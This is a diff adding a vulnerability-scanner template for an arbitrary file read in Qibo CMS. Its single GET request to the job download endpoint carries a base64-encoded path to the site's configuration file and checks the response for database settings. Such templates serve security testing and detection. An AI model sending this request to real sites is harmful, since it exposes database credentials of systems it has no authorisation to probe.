@@ -1,0 +1,19 @@
+id: qibo-cms-job-file-read
+
+info:
+  name: Qibo CMS Job File Read
+  author: Cuerz
+  severity: high
+  verified: true
+  reference:
+    - https://blog.csdn.net/m0_46371267/article/details/124346624
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+    expression:
+      response.status==200 && response.body.bcontains(b'$webdb') && response.raw_header.bcontains(b'ph<')
+
+expression: r0()
